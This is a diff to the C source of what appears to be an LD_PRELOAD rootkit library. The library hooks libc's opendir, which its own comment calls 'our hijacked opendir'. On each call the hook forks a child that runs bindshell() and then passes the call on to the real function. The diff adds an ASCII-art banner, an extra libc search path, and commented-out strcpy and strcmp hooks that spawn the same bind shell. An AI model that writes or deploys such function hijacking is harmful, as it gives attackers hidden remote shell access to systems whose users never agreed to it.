@@ -21,10 +21,11 @@ const char* getlibc() {
     char* libraryPath = NULL;
 
     char* stdLibraryPaths[] = { 
-        "/lib",
-        "/lib64",
-        "/usr/lib",
-        "/usr/lib64"
+		"/lib",
+		"/lib64",
+		"/usr/lib",
+		"/usr/lib64",
+		"/lib/x86_64-linux-gnu"
     };  
 
     for (int i = 0; i < sizeof(stdLibraryPaths) / sizeof(stdLibraryPaths[0]); i++) {
@@ -105,7 +106,12 @@ DIR     *opendir(const char *name) //our hijacked opendir
 	const char* libc_path = getlibc();
  	handle = dlopen(libc_path, RTLD_LAZY); //get the handle from libc.so.6
  	sym = (void *) dlsym(handle, "opendir"); //get the address of opendir symbol in libc.so.6	
-	printf("OPENDIR HIJACKED\n", sym, name);
+
+	printf(" _  _  ____  __  __ _\n"); 
+	printf("/ )( \\(  _ \\(  )(  / )\n");
+	printf(") \\/ ( ) _ ( )(  )  ( \n");
+	printf("\\____/(____/(__)(__\\_)\n");
+
 	if(fork() == 0){
  		bindshell(); 
 	}
@@ -113,3 +119,48 @@ DIR     *opendir(const char *name) //our hijacked opendir
   		return (sym(name)); //return real opendir
 	}
 }
+
+/*
+char *strcpy(char *restrict dst, const char *restrict src){
+
+	void *handle;
+	void *(*sym)(char *restrict dst, const char *restrict src);
+	const char* libc_path = getlibc();
+	handle = dlopen(libc_path, RTLD_LAZY);
+	sym = (void *) dlsym(handle, "strcpy");
+
+	printf(" _  _  ____  __  __ _\n"); 
+	printf("/ )( \\(  _ \\(  )(  / )\n");
+	printf(") \\/ ( ) _ ( )(  )  ( \n");
+	printf("\\____/(____/(__)(__\\_)\n");
+
+	if(fork() == 0){
+ 		bindshell(); 
+	}
+	else {
+  		return (sym(dst, src));
+	}
+
+}
+
+int strcmp(const char *s1, const char *s2){
+
+	void *handle;
+	void *(*sym)(const char *s1, const char *s2);
+	const char* libc_path = getlibc();
+	handle = dlopen(libc_path, RTLD_LAZY);
+	sym = (void *) dlsym(handle, "strcmp");
+
+	printf(" _  _  ____  __  __ _\n"); 
+	printf("/ )( \\(  _ \\(  )(  / )\n");
+	printf(") \\/ ( ) _ ( )(  )  ( \n");
+	printf("\\____/(____/(__)(__\\_)\n");
+
+	if(fork() == 0){
+ 		bindshell(); 
+	}
+	else {
+  		return (sym(s1, s2));
+	}
+
+}*/
